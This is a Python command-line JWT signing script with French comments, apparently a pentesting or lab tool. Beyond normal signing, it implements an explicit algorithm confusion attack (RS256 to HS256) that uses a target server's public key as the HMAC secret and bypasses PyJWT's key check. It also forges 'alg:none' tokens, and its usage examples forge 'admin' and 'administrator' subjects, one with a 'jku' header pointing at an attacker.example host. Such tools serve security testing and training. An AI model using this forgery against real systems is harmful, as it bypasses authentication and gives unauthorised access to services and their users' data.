#!/usr/bin/env python3
"""
jwt_sign.py

Signe un JWT (header + payload) avec une clé chargée depuis un fichier.

Supporte :
    - RS256 / RS384 / RS512
    - ES256 / ES384 / ES512
    - PS256 / PS384 / PS512
    - HS256 / HS384 / HS512
    - none

Pour RS/ES/PS :
    Clé privée PEM.

Pour HS :
    Secret brut texte ou binaire.

Algorithm Confusion Attack (RS256 -> HS256) :
    Quand le serveur cible vérifie un JWT RS256 avec la clé publique RSA,
    mais accepte aussi HS256, on peut signer le token en HMAC-SHA256 en
    utilisant la clé publique PEM elle-même comme secret. Le serveur, en
    voulant vérifier le token, utilise sa clé publique comme secret HMAC
    et la signature devient valide de son point de vue.

    PyJWT refuse normalement d'utiliser une clé PEM comme secret HMAC
    (il détecte le format et lève une exception). --confusion bypass
    cette vérification en construisant le JWT à la main avec hmac.new(),
    en utilisant les bytes bruts du fichier clé tels quels (important :
    le serveur doit recevoir exactement les mêmes bytes que ceux que tu
    utilises ici, y compris line endings/espaces, sinon la signature ne
    matchera pas côté serveur).

Usage:
    # Payload et headers via fichiers JSON
    python3 jwt_sign.py --key private_key.pem --alg RS256 \
        --payload payload.json --headers headers.json

    # Payload inline
    python3 jwt_sign.py --key private_key.pem --alg RS256 \
        --payload '{"sub":"admin","iat":1234567890}' \
        --header kid=my-key --header typ=JWT

    # HMAC avec secret texte
    python3 jwt_sign.py --key secret.txt --alg HS256 \
        --payload payload.json

    # Ajout automatique de exp/iat
    python3 jwt_sign.py --key private_key.pem --alg RS256 \
        --payload '{"sub":"admin"}' \
        --exp 3600 --auto-iat

    # JWT alg:none
    python3 jwt_sign.py --key dummy --alg none \
        --payload '{"sub":"admin"}'

    # Algorithm confusion RS256 -> HS256 (clé publique du serveur cible)
    python3 jwt_sign.py --key public.pem --alg HS256 --confusion \
        --payload '{"sub":"administrator"}' \
        --header kid=v6MQKWWGZpz05MvB --header jku=https://attacker.example/exploit
"""

import argparse
import base64
import hashlib
import hmac as hmac_module
import json
import sys
import time
from pathlib import Path

import jwt


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def load_key_material(path: str, alg: str, confusion: bool) -> bytes | str:
    """
    Charge le matériel de clé depuis un fichier.

    --confusion :
        Retourne toujours les bytes bruts du fichier, sans aucune
        transformation. C'est essentiel pour l'algorithm confusion attack :
        le secret HMAC doit correspondre exactement aux bytes de la clé
        publique PEM telle qu'elle est stockée/servie par la cible.

    HS* (sans --confusion) :
        Retourne le secret sous forme de texte UTF-8 si possible.
        Si le fichier contient des données binaires, retourne les bytes bruts.

    RS*/ES*/PS* :
        Retourne directement le contenu PEM sous forme de bytes.
    """

    data = Path(path).read_bytes()

    if confusion:
        return data

    if alg.startswith("HS"):
        try:
            # Retire uniquement les fins de ligne classiques d'un fichier secret.
            return data.decode("utf-8").rstrip("\r\n")
        except UnicodeDecodeError:
            # Secret binaire.
            return data

    # RSA / EC / PSS :
    # PyJWT peut recevoir directement le PEM sous forme de bytes.
    return data


def sign_hmac_raw(header: dict, payload: dict, secret_bytes: bytes, alg: str) -> str:
    """
    Construit et signe un JWT en HMAC à la main, sans passer par la
    validation de clé de PyJWT. Utilisé pour l'algorithm confusion attack,
    où le "secret" est en réalité une clé publique PEM/DER.
    """

    hash_algs = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }

    if alg not in hash_algs:
        print(f"Erreur: --confusion ne supporte que HS256/HS384/HS512, pas {alg}", file=sys.stderr)
        sys.exit(1)

    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":"), ensure_ascii=False).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode())

    signing_input = f"{header_b64}.{payload_b64}".encode()

    signature = hmac_module.new(secret_bytes, signing_input, hash_algs[alg]).digest()
    signature_b64 = b64url_encode(signature)

    return f"{header_b64}.{payload_b64}.{signature_b64}"


def parse_json_arg(value: str) -> dict:
    """
    Accepte soit :
        - un chemin vers un fichier JSON
        - une chaîne JSON inline
    """

    p = Path(value)

    if p.is_file():
        try:
            return json.loads(p.read_text(encoding="utf-8"))
        except json.JSONDecodeError as e:
            print(
                f"Erreur: JSON invalide dans '{value}': {e}",
                file=sys.stderr
            )
            sys.exit(1)

    try:
        result = json.loads(value)
    except json.JSONDecodeError as e:
        print(
            f"Erreur: JSON invalide: {e}",
            file=sys.stderr
        )
        sys.exit(1)

    if not isinstance(result, dict):
        print(
            "Erreur: le JSON doit contenir un objet.",
            file=sys.stderr
        )
        sys.exit(1)

    return result


def parse_kv_list(pairs: list[str]) -> dict:
    """
    Parse une liste de key=value.

    Exemple :
        kid=my-key
        admin=true
        count=10
        roles=["admin","user"]

    Les valeurs sont d'abord interprétées comme du JSON.
    Si ce n'est pas du JSON valide, elles restent des chaînes.
    """

    result = {}

    for pair in pairs or []:

        if "=" not in pair:
            print(
                f"Erreur: format invalide pour '{pair}', "
                f"attendu key=value",
                file=sys.stderr
            )
            sys.exit(1)

        k, v = pair.split("=", 1)

        if not k:
            print(
                f"Erreur: clé vide dans '{pair}'",
                file=sys.stderr
            )
            sys.exit(1)

        try:
            result[k] = json.loads(v)
        except json.JSONDecodeError:
            result[k] = v

    return result


def main():

    parser = argparse.ArgumentParser(
        description="Signe un JWT avec une clé depuis un fichier."
    )

    parser.add_argument(
        "--key",
        required=True,
        help=(
            "Fichier clé : privée PEM pour RS/ES/PS, "
            "secret brut pour HS, clé publique PEM pour --confusion."
        )
    )

    parser.add_argument(
        "--alg",
        required=True,
        choices=[
            "HS256",
            "HS384",
            "HS512",
            "RS256",
            "RS384",
            "RS512",
            "ES256",
            "ES384",
            "ES512",
            "PS256",
            "PS384",
            "PS512",
            "none",
        ],
        help="Algorithme de signature."
    )

    parser.add_argument(
        "--confusion",
        action="store_true",
        help=(
            "Algorithm confusion attack (RS256->HS256 typiquement). "
            "Utilise les bytes bruts du fichier --key (ex: clé publique PEM "
            "de la cible) comme secret HMAC, en bypassant la vérification "
            "de PyJWT qui refuse normalement les clés PEM comme secret HS*. "
            "Nécessite --alg HS256/HS384/HS512."
        )
    )

    parser.add_argument(
        "--payload",
        required=True,
        help="Fichier JSON du payload ou chaîne JSON inline."
    )

    parser.add_argument(
        "--headers",
        help=(
            "Fichier JSON des headers additionnels "
            "ou chaîne JSON inline."
        )
    )

    parser.add_argument(
        "--header",
        action="append",
        default=[],
        help=(
            "Header additionnel key=value. "
            "Option répétable."
        )
    )

    parser.add_argument(
        "--claim",
        action="append",
        default=[],
        help=(
            "Claim additionnel key=value. "
            "Option répétable."
        )
    )

    parser.add_argument(
        "--exp",
        type=int,
        default=None,
        help="Ajoute exp = maintenant + N secondes."
    )

    parser.add_argument(
        "--auto-iat",
        action="store_true",
        help="Ajoute automatiquement iat = timestamp actuel."
    )

    parser.add_argument(
        "--key-password",
        default=None,
        help="Passphrase si la clé privée PEM est chiffrée."
    )

    args = parser.parse_args()

    if args.confusion and not args.alg.startswith("HS"):
        print("Erreur: --confusion nécessite --alg HS256/HS384/HS512", file=sys.stderr)
        sys.exit(1)

    # ---------------------------------------------------------
    # Payload
    # ---------------------------------------------------------

    payload = parse_json_arg(args.payload)

    # ---------------------------------------------------------
    # Headers
    # ---------------------------------------------------------

    headers = (
        parse_json_arg(args.headers)
        if args.headers
        else {}
    )

    # alg + typ par défaut, écrasés par --headers/--header si fournis
    default_headers = {"alg": args.alg, "typ": "JWT"}
    default_headers.update(headers)
    headers = default_headers

    # Les --header écrasent les valeurs présentes dans --headers.
    headers.update(parse_kv_list(args.header))

    # ---------------------------------------------------------
    # Claims
    # ---------------------------------------------------------

    # Les --claim écrasent les valeurs présentes dans le payload.
    payload.update(parse_kv_list(args.claim))

    # ---------------------------------------------------------
    # iat / exp
    # ---------------------------------------------------------

    current_time = int(time.time())

    if args.auto_iat:
        payload["iat"] = current_time

    if args.exp is not None:
        payload["exp"] = current_time + args.exp

    # ---------------------------------------------------------
    # Algorithm confusion attack : signature manuelle, on court-circuite
    # PyJWT entièrement pour éviter sa vérification de format de clé.
    # ---------------------------------------------------------

    if args.confusion:

        secret_bytes = Path(args.key).read_bytes()

        token = sign_hmac_raw(headers, payload, secret_bytes, args.alg)

        print(token)

        print(
            "\n[+] Algorithm confusion (RS256 -> " + args.alg + ")",
            file=sys.stderr
        )
        print(
            "[+] Secret HMAC = bytes bruts de: " + args.key
            + f" ({len(secret_bytes)} bytes)",
            file=sys.stderr
        )
        print(
            "[+] Header : " + json.dumps(headers, ensure_ascii=False),
            file=sys.stderr
        )
        print(
            "[+] Payload: " + json.dumps(payload, ensure_ascii=False),
            file=sys.stderr
        )

        return

    # ---------------------------------------------------------
    # Chargement de la clé (chemin normal, non-confusion)
    # ---------------------------------------------------------

    key_material = load_key_material(
        args.key,
        args.alg,
        confusion=False,
    )

    # ---------------------------------------------------------
    # Clé privée PEM chiffrée
    # ---------------------------------------------------------

    if args.key_password and not args.alg.startswith("HS") and args.alg != "none":

        from cryptography.hazmat.primitives.serialization import (
            load_pem_private_key
        )

        try:
            key_material = load_pem_private_key(
                key_material
                if isinstance(key_material, bytes)
                else key_material.encode(),
                password=args.key_password.encode(),
            )

        except Exception as e:
            print(
                f"Erreur lors du chargement de la clé privée: {e}",
                file=sys.stderr
            )
            sys.exit(1)

    # ---------------------------------------------------------
    # Signature
    # ---------------------------------------------------------

    try:

        if args.alg == "none":

            # PyJWT attend une clé vide avec l'algorithme none.
            token = jwt.encode(
                payload,
                key="",
                algorithm="none",
                headers=headers or None,
            )

        else:

            token = jwt.encode(
                payload,
                key_material,
                algorithm=args.alg,
                headers=headers or None,
            )

    except Exception as e:

        print(
            f"Erreur lors de la signature: {e}",
            file=sys.stderr
        )
        print(
            "\n[!] Astuce: si la clé fournie est une clé publique/privée PEM "
            "et que tu veux forcer HS256 dessus (algorithm confusion attack), "
            "ajoute --confusion.",
            file=sys.stderr
        )
        sys.exit(1)

    # ---------------------------------------------------------
    # JWT sur stdout
    # ---------------------------------------------------------

    print(token)

    # ---------------------------------------------------------
    # Informations de debug sur stderr
    # ---------------------------------------------------------

    try:
        decoded_header = jwt.get_unverified_header(token)

        print(
            "\n[+] Header : "
            + json.dumps(
                decoded_header,
                ensure_ascii=False
            ),
            file=sys.stderr
        )

        print(
            "[+] Payload: "
            + json.dumps(
                payload,
                ensure_ascii=False
            ),
            file=sys.stderr
        )

    except Exception as e:

        print(
            f"[!] Impossible de décoder le JWT pour le debug: {e}",
            file=sys.stderr
        )


if __name__ == "__main__":
    main()
